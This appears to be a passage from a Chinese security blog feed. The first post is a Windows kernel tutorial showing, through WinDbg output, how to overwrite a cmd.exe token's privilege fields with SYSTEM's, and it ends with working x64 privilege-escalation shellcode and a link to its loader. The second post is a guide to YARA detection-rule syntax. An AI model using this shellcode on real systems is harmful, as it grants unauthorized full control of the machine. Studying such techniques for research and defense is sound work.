<h2 id="方法三：直接编辑权限"><a href="#方法三：直接编辑权限" class="headerlink" title="方法三：直接编辑权限"></a>方法三：直接编辑权限</h2><h3 id="windbg调试"><a href="#windbg调试" class="headerlink" title="windbg调试"></a>windbg调试</h3><p>此方法比替换token的更进一步，直接修改token中的<code>SEP_TOKEN_PRIVILEGES</code>以达到权限提升的目的，此方法有一个好处是被修改进程的用户名等信息不会改变，只是权限改变了。</p>
<p>我们看一下具体的数据结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; dt _token </span><br><span class="line">nt!_TOKEN</span><br><span class="line">   +0x000 TokenSource      : _TOKEN_SOURCE</span><br><span class="line">   +0x010 TokenId          : _LUID</span><br><span class="line">   +0x018 AuthenticationId : _LUID</span><br><span class="line">   +0x020 ParentTokenId    : _LUID</span><br><span class="line">   +0x028 ExpirationTime   : _LARGE_INTEGER</span><br><span class="line">   +0x030 TokenLock        : Ptr64 _ERESOURCE</span><br><span class="line">   +0x038 ModifiedId       : _LUID</span><br><span class="line">   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES</span><br><span class="line">   ......</span><br><span class="line">  </span><br><span class="line">1: kd&gt; dt _SEP_TOKEN_PRIVILEGES </span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x000 Present          : Uint8B</span><br><span class="line">   +0x008 Enabled          : Uint8B</span><br><span class="line">   +0x010 EnabledByDefault : Uint8B</span><br></pre></td></tr></table></figure>

<p><code>_SEP_TOKEN_PRIVILEGES</code>中：</p>
<ul>
<li>Present 表示启用的特权</li>
<li>Enabled字段表示当前拥有的特权</li>
<li>EnabledByDefault 默认拥有的特权</li>
</ul>
<p>我们看一下system进程和cmd.exe进程分别的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; !process 0 0 system</span><br><span class="line">PROCESS ffffbf845d896040</span><br><span class="line">    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 001ad002  ObjectTable: ffff8e0936605d40  HandleCount: 2284.</span><br><span class="line">    Image: System</span><br><span class="line"></span><br><span class="line">1: kd&gt; dq ffffbf845d896040+0x360 L1 </span><br><span class="line">ffffbf84&#96;5d8963a0  ffff8e09&#96;36607725</span><br><span class="line">1: kd&gt; dt _SEP_TOKEN_PRIVILEGES ffff8e09&#96;36607720+0x40  </span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x000 Present          : 0x0000001f&#96;f2ffffbc</span><br><span class="line">   +0x008 Enabled          : 0x0000001e&#96;60b1e890</span><br><span class="line">   +0x010 EnabledByDefault : 0x0000001e&#96;60b1e890</span><br><span class="line">  </span><br><span class="line">1: kd&gt; !token ffff8e09&#96;36607720 </span><br><span class="line">_TOKEN 0xffff8e0936607720</span><br><span class="line">TS Session ID: 0</span><br><span class="line">User: S-1-5-18</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-32-544</span><br><span class="line">    Attributes - Default Enabled Owner </span><br><span class="line"> 01 S-1-1-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-11</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 03 S-1-16-16384</span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S-1-5-18</span><br><span class="line">Privs: </span><br><span class="line"> 02 0x000000002 SeCreateTokenPrivilege            Attributes - </span><br><span class="line"> 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - </span><br><span class="line"> 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default </span><br><span class="line"> 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - </span><br><span class="line"> 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default </span><br><span class="line"> 08 0x000000008 SeSecurityPrivilege               Attributes - </span><br><span class="line"> 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - </span><br><span class="line"> 10 0x00000000a SeLoadDriverPrivilege             Attributes - </span><br><span class="line"> 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default </span><br><span class="line"> 12 0x00000000c SeSystemtimePrivilege             Attributes - </span><br><span class="line"> 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default </span><br><span class="line"> 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default </span><br><span class="line"> 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default </span><br><span class="line"> 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default </span><br><span class="line"> 17 0x000000011 SeBackupPrivilege                 Attributes - </span><br><span class="line"> 18 0x000000012 SeRestorePrivilege                Attributes - </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege               Attributes - </span><br><span class="line"> 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default </span><br><span class="line"> 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default </span><br><span class="line"> 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege                 Attributes - </span><br><span class="line"> 28 0x00000001c SeManageVolumePrivilege           Attributes - </span><br><span class="line"> 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default </span><br><span class="line"> 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default </span><br><span class="line"> 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - </span><br><span class="line"> 32 0x000000020 SeRelabelPrivilege                Attributes - </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default </span><br><span class="line"> 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default </span><br><span class="line"> 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default </span><br><span class="line">Authentication ID:         (0,3e7)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: *SYSTEM*           TokenFlags: 0x2000 ( Token NOT in use ) </span><br><span class="line">Token ID: 3eb              ParentToken ID: 0</span><br><span class="line">Modified ID:               (0, 3ec)</span><br><span class="line">RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 0</span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: 0      Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims</span><br><span class="line">Process Token TrustLevelSid: S-1-19-1024-8192</span><br></pre></td></tr></table></figure>

<p>cmd.exe进程相关的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; !process  0 0 cmd.exe </span><br><span class="line">PROCESS ffffab887e89d080</span><br><span class="line">    SessionId: 1  Cid: 1b40    Peb: 92bee25000  ParentCid: 0c70</span><br><span class="line">    DirBase: 469ed002  ObjectTable: ffff898d05d6ee00  HandleCount:  70.</span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dq  ffffab887e89d080+0x360 L1 </span><br><span class="line">ffffab88&#96;7e89d3e0  ffff898d&#96;050a667c</span><br><span class="line">0: kd&gt; dt _SEP_TOKEN_PRIVILEGES   ffff898d&#96;050a6670+0x40 </span><br><span class="line">nt!_SEP_TOKEN_PRIVILEGES</span><br><span class="line">   +0x000 Present          : 0x00000006&#96;02880000</span><br><span class="line">   +0x008 Enabled          : 0x800000</span><br><span class="line">   +0x010 EnabledByDefault : 0x40800000</span><br><span class="line">0: kd&gt; !token ffff898d&#96;050a6670</span><br><span class="line">_TOKEN 0xffff898d050a6670</span><br><span class="line">TS Session ID: 0x1</span><br><span class="line">User: S-1-5-21-2935577425-332436725-3672547902-1000</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-21-2935577425-332436725-3672547902-513</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 01 S-1-1-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-114</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 03 S-1-5-32-544</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 04 S-1-5-32-545</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 05 S-1-5-4</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 06 S-1-2-1</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 07 S-1-5-11</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 08 S-1-5-15</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 09 S-1-5-113</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 10 S-1-5-5-0-123671</span><br><span class="line">    Attributes - Mandatory Default Enabled LogonId </span><br><span class="line"> 11 S-1-2-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 12 S-1-5-64-10</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 13 S-1-16-8192</span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S-1-5-21-2935577425-332436725-3672547902-513</span><br><span class="line">Privs: </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege               Attributes - </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege                 Attributes - </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege               Attributes - </span><br><span class="line">Authentication ID:         (0,1e50f)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: User32             TokenFlags: 0x2a00 ( Token in use )</span><br><span class="line">Token ID: eede5            ParentToken ID: 0</span><br><span class="line">Modified ID:               (0, 1e51b)</span><br><span class="line">RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 3e7</span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: 0      Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink</span><br><span class="line">Process Token TrustLevelSid: (null)</span><br></pre></td></tr></table></figure>

<p>可以看到<code>cmde.exe</code> 拥有的特权明显比<code>system</code>少很多，接下来修改cmd.exe的<code>Present</code>,<code>Enabled</code>都和<code>system</code>相同，再看一下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0: kd&gt; eq ffff898d&#96;050a6670+0x40 0x0000001f&#96;f2ffffbc </span><br><span class="line">0: kd&gt; eq ffff898d&#96;050a6670+0x48 0x0000001f&#96;f2ffffbc </span><br><span class="line">0: kd&gt; !token ffff898d&#96;050a6670</span><br><span class="line">_TOKEN 0xffff898d050a6670</span><br><span class="line">TS Session ID: 0x1</span><br><span class="line">User: S-1-5-21-2935577425-332436725-3672547902-1000</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-21-2935577425-332436725-3672547902-513</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 01 S-1-1-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-114</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 03 S-1-5-32-544</span><br><span class="line">    Attributes - DenyOnly </span><br><span class="line"> 04 S-1-5-32-545</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 05 S-1-5-4</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 06 S-1-2-1</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 07 S-1-5-11</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 08 S-1-5-15</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 09 S-1-5-113</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 10 S-1-5-5-0-123671</span><br><span class="line">    Attributes - Mandatory Default Enabled LogonId </span><br><span class="line"> 11 S-1-2-0</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 12 S-1-5-64-10</span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> 13 S-1-16-8192</span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S-1-5-21-2935577425-332436725-3672547902-513</span><br><span class="line">Privs: </span><br><span class="line"> 02 0x000000002 SeCreateTokenPrivilege            Attributes - Enabled </span><br><span class="line"> 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - Enabled </span><br><span class="line"> 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled </span><br><span class="line"> 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - Enabled </span><br><span class="line"> 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled </span><br><span class="line"> 08 0x000000008 SeSecurityPrivilege               Attributes - Enabled </span><br><span class="line"> 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - Enabled </span><br><span class="line"> 10 0x00000000a SeLoadDriverPrivilege             Attributes - Enabled </span><br><span class="line"> 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled </span><br><span class="line"> 12 0x00000000c SeSystemtimePrivilege             Attributes - Enabled </span><br><span class="line"> 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled </span><br><span class="line"> 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled </span><br><span class="line"> 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled </span><br><span class="line"> 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled </span><br><span class="line"> 17 0x000000011 SeBackupPrivilege                 Attributes - Enabled </span><br><span class="line"> 18 0x000000012 SeRestorePrivilege                Attributes - Enabled </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege               Attributes - Enabled </span><br><span class="line"> 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled </span><br><span class="line"> 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled </span><br><span class="line"> 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - Enabled </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege                 Attributes - Enabled </span><br><span class="line"> 28 0x00000001c SeManageVolumePrivilege           Attributes - Enabled </span><br><span class="line"> 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled </span><br><span class="line"> 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default </span><br><span class="line"> 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - Enabled </span><br><span class="line"> 32 0x000000020 SeRelabelPrivilege                Attributes - Enabled </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled </span><br><span class="line"> 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled </span><br><span class="line"> 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled </span><br><span class="line">Authentication ID:         (0,1e50f)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: User32             TokenFlags: 0x2a00 ( Token in use )</span><br><span class="line">Token ID: eede5            ParentToken ID: 0</span><br><span class="line">Modified ID:               (0, 1e51b)</span><br><span class="line">RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 3e7</span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: 0      Capabilities: 0x0000000000000000</span><br><span class="line">LowboxNumberEntry: 0x0000000000000000</span><br><span class="line">Security Attributes:</span><br><span class="line">Unable to get the offset of nt!_AUTHZBASEP_SECURITY_ATTRIBUTE.ListLink</span><br><span class="line">Process Token TrustLevelSid: (null)</span><br></pre></td></tr></table></figure>

<p>可以看到权限已经修改成功，但是来查看cmd.exe的用户名，发现并没有改变。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210822193044.png" alt=""></p>
<p>当前进程已经有了system权限，接下来依然可以通过注入，弹出一个system权限的shell。</p>
<h3 id="写shellcode-2"><a href="#写shellcode-2" class="headerlink" title="写shellcode"></a>写shellcode</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov r9,qword ptr [gs:0x188]                   ;stores KPROCESS&#x2F;currentThread value</span><br><span class="line">mov r9,qword ptr [r9+0x220]                   ;stores EPROCESS as an offset to KTHREAD</span><br><span class="line">mov rcx, r9                                   ;if equal, saves EPROCESS into rcx</span><br><span class="line">add rcx, 0x360                                ;store cmd&#39;s token into rcx</span><br><span class="line">mov rax,qword ptr [rcx]                       ;store token into rax</span><br><span class="line">and rax, 0xFFFFFFFFFFFFFFF0                   ;remove the last nibble (fast reference)</span><br><span class="line">mov r8,  0x1ff2ffffbc                         ;stores the &#39;all-in&#39; privileges value into r8</span><br><span class="line">mov qword ptr [rax+0x40],r8                   ;Changes &#39;Privileges&#39; at offset 0x40 and god-mode it</span><br><span class="line">mov qword ptr [rax+0x48],r8                   ;Changes &#39;Privileges&#39; at offset 0x48 and god-mode it</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<h2 id="相关的代码"><a href="#相关的代码" class="headerlink" title="相关的代码"></a>相关的代码</h2><p>上面的测试代码放在github上，<a href="https://github.com/wonderkun/flare-kscldr" target="_blank" rel="noopener">https://github.com/wonderkun/flare-kscldr</a></p>
]]></content>
      <categories>
        <category>windows驱动</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>asm</tag>
        <tag>kernal</tag>
      </tags>
  </entry>
  <entry>
    <title>yara匹配引擎进阶语法指南</title>
    <url>/2023/02/07/yara%E5%8C%B9%E9%85%8D%E5%BC%95%E6%93%8E%E8%BF%9B%E9%98%B6%E8%AF%AD%E6%B3%95%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>具备检测相关经验的同学可能都对yara匹配引擎比较熟悉了，看雪论坛上也有非常详细的翻译文章 - <a href="https://bbs.kanxue.com/thread-226011.htm" target="_blank" rel="noopener">编写Yara规则检测恶意软件</a><br>本文主要对yara文档容易被忽略的部分进行了翻译和总结，并且给出一些进阶用法的例子，提高对yara匹配引擎语法的理解程度。</p>
<a id="more"></a>

<p><strong><br /></strong>参考文档：**<br /><br><a href="https://yara.readthedocs.io/en/v4.2.3/writingrules.html" target="_blank" rel="noopener">https://yara.readthedocs.io/en/v4.2.3/writingrules.html</a></p>
<h2 id="匹配字符串"><a href="#匹配字符串" class="headerlink" title="匹配字符串"></a>匹配字符串</h2><p>yara的匹配字符串可以使用一些修饰符，总结下来有如下部分：</p>
<table>
<thead>
<tr>
<th>关键词</th>
<th>支持的字符串类型</th>
<th>概括</th>
<th>限制</th>
</tr>
</thead>
<tbody><tr>
<td>nocase</td>
<td>文本，正则表达式</td>
<td>忽略大小写</td>
<td>不能与xor、base64、 或base64wide一起使用</td>
</tr>
<tr>
<td>wide</td>
<td>文本，正则表达式</td>
<td>通过交错空 (0x00) 字符来模拟 UTF16</td>
<td>无</td>
</tr>
<tr>
<td>ascii</td>
<td>文本，正则表达式</td>
<td>匹配 ASCII 字符，仅在wide使用时才需要</td>
<td>无</td>
</tr>
<tr>
<td>xor</td>
<td>文本</td>
<td>匹配具有单字节键的 XOR 文本字符串</td>
<td>不能与nocase、base64、 或base64wide一起使用</td>
</tr>
<tr>
<td>base64</td>
<td>文本</td>
<td>base64 编码的字符串(分割成3条)</td>
<td>不能与nocase、xor、 或fullword一起使用</td>
</tr>
<tr>
<td>base64wide</td>
<td>文本</td>
<td>base64 编码的字符串(分割成3条)，然后交错空字符，如 wide</td>
<td>不能与nocase、xor、 或fullword一起使用</td>
</tr>
<tr>
<td>fullword</td>
<td>文本，正则表达式</td>
<td>匹配前后没有字母数字挨着的字符(串)</td>
<td>不能与base64或一起使用base64wide一起使用</td>
</tr>
<tr>
<td>private</td>
<td>十六进制、文本、正则表达式</td>
<td>匹配不包含在输出中</td>
<td>无</td>
</tr>
</tbody></table>
<h3 id="base64修饰符"><a href="#base64修饰符" class="headerlink" title="base64修饰符"></a>base64修饰符</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule Base64Example1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"This program cannot"</span> base64</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将至少会匹配如下三个字符串：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">VGhpcyBwcm9ncmFtIGNhbm5vd</span><br><span class="line">RoaXMgcHJvZ3JhbSBjYW5ub3</span><br><span class="line">UaGlzIHByb2dyYW0gY2Fubm90</span><br></pre></td></tr></table></figure>
<p>看起来很奇怪，原因如下：<br /><strong>base64是将三个字节变成四个字节，如果不能被整除，那就会涉及到补位，同样的字符串可能因为前缀的不一样导致编码结果不同，这个不一致的循环次数是3，看如下的编码结果就明白了。</strong><br /><img src="https://intranetproxy.alipay.com/skylark/lark/0/2022/png/327065/1665999287509-f33ed94f-782d-45be-b663-a578bd599ca0.png#clientId=u4e5591a9-74b3-4&errorMessage=unknown%20error&from=paste&height=208&id=ua1026f3d&name=image.png&originHeight=416&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&size=97137&status=error&style=none&taskId=u30985312-8284-481f-b866-65b93522771&title=&width=490" alt="image.png"><br />三个结果对应这三个不同前缀。<br/>详情请阅读文档：<a href="https://www.leeholmes.com/searching-for-content-in-base-64-strings/" target="_blank" rel="noopener">https://www.leeholmes.com/searching-for-content-in-base-64-strings/</a><br />另外base64和base64wide修饰符支持自定义的字符码表，可以匹配一些被修改过的base64编码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule Base64Example2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"This program cannot"</span> base64(<span class="string">"!@#$%^&amp;*()&#123;&#125;[].,|ABCDEFGHIJ\x09LMNOPQRSTUVWXYZabcdefghijklmnopqrstu"</span>)</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="XOR修饰符"><a href="#XOR修饰符" class="headerlink" title="XOR修饰符"></a>XOR修饰符</h3><p>xor 修饰符是将声明的字符串按照 [0x01 - 0xFF] 都进行单字节异或，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule XorExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$xor_string</span> = <span class="string">"This program cannot"</span> xor</span><br><span class="line"></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$xor_string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>等价于：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule XorExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$xor_string_00</span> = <span class="string">"This program cannot"</span></span><br><span class="line">        <span class="variable">$xor_string_01</span> = <span class="string">"Uihr!qsnfs`l!b`oonu"</span>  // xor 0x1 </span><br><span class="line">        <span class="variable">$xor_string_02</span> = <span class="string">"Vjkq\"rpmepco\"acllmv"</span> // xor 0x2 </span><br><span class="line">        // Repeat <span class="keyword">for</span> every single byte XOR</span><br><span class="line">    condition:</span><br><span class="line">        any of them</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外还支持参数，限定xor的范围：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule XorExample5</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$xor_string</span> = <span class="string">"This program cannot"</span> xor(0x01-0x3F)</span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$xor_string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="匹配条件的语法"><a href="#匹配条件的语法" class="headerlink" title="匹配条件的语法"></a>匹配条件的语法</h2><h3 id="支持的运算符"><a href="#支持的运算符" class="headerlink" title="支持的运算符"></a>支持的运算符</h3><p>所有运算符的优先级如下：</p>
<table>
<thead>
<tr>
<th>优先级</th>
<th>操作</th>
<th>描述</th>
<th>性质</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>[]</strong><br /><strong>.</strong></td>
<td>Array subscripting   数组下标<br />Structure member access  结构成员访问</td>
<td>从左到右</td>
</tr>
<tr>
<td>2</td>
<td><strong>–</strong><br /><strong>~</strong></td>
<td>Unary minus  按位减<br />Bitwise not  按位非</td>
<td>从右到左</td>
</tr>
<tr>
<td>3</td>
<td><strong>***<br /></strong>\<strong><br /></strong>%**</td>
<td>Multiplication  乘法<br />Division  除法<br />Remainder  取余</td>
<td>从左到右</td>
</tr>
<tr>
<td>4</td>
<td><strong>+</strong><br /><strong>–</strong></td>
<td>Addition  加法<br />Subtraction  减法</td>
<td>从左到右</td>
</tr>
<tr>
<td>5</td>
<td><strong>&lt;&lt;</strong><br /><strong>&gt;&gt;</strong></td>
<td>Bitwise left shift  按位左移<br />Bitwise right shift  按位右移</td>
<td>从左到右</td>
</tr>
<tr>
<td>6</td>
<td><strong>&amp;</strong></td>
<td>Bitwise AND  按位与</td>
<td>从左到右</td>
</tr>
<tr>
<td>7</td>
<td><strong>^</strong></td>
<td>Bitwise XOR  按位异或</td>
<td>从左到右</td>
</tr>
<tr>
<td>8</td>
<td><strong>&#124;</strong></td>
<td>Bitwise OR  按位或</td>
<td>从左到右</td>
</tr>
<tr>
<td>9</td>
<td><strong>&lt;</strong><br /><strong>&lt;=</strong><br /><strong>&gt;</strong><br /><strong>&gt;=</strong></td>
<td>Less than  小于<br />Less than or equal to  小于等于<br />Greater than  大于<br />Greater than or equal to  大于等于</td>
<td>从左到右</td>
</tr>
<tr>
<td>10</td>
<td><strong>==</strong><br /><strong>!=</strong><br /><strong>contains</strong><br /><strong>icontains</strong><br /><strong>startswith</strong><br /><strong>istartswith</strong><br /><strong>endswith</strong><br /><strong>iendswith</strong><br /><strong>matches</strong></td>
<td>Equal to  等于<br />Not equal to  不等于<br />String contains substring  包含<br />Like contains but case-insensitive  包含不区分大小写<br />String starts with substring  以开始字符串<br />Like startswith but case-insensitive 以开始字符串不区分大小写<br />String ends with substring  以结尾字符串<br />Like endswith but case-insensitive  以结尾字符串区分大小写<br />String matches regular expression  正则表达式</td>
<td>从左到右</td>
</tr>
<tr>
<td>11</td>
<td><strong>not</strong></td>
<td>Logical NOT  逻辑非</td>
<td>从右到左</td>
</tr>
<tr>
<td>12</td>
<td><strong>and</strong></td>
<td>Logical AND  逻辑与</td>
<td>从左到右</td>
</tr>
<tr>
<td>13</td>
<td><strong>or</strong></td>
<td>Logical OR  逻辑或</td>
<td>从左到右</td>
</tr>
</tbody></table>
<h3 id="字符串计数"><a href="#字符串计数" class="headerlink" title="字符串计数"></a>字符串计数</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule CountExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="comment">#a == 6 and #b &gt; 10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还能指定范围计数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a in (filesize-500..filesize) == 2</span></span><br></pre></td></tr></table></figure>
<h3 id="字符串偏移或者虚拟地址"><a href="#字符串偏移或者虚拟地址" class="headerlink" title="字符串偏移或者虚拟地址"></a>字符串偏移或者虚拟地址</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rule AtExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$a</span> at 100 and <span class="variable">$b</span> at 200</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule InExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="variable">$a</span> = <span class="string">"dummy1"</span></span><br><span class="line">        <span class="variable">$b</span> = <span class="string">"dummy2"</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="variable">$a</span> <span class="keyword">in</span> (0..100) and <span class="variable">$b</span> <span class="keyword">in</span> (100..filesize)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>取字符串第i次出现的偏移，<strong>注意只能用 == 运算符</strong></p>
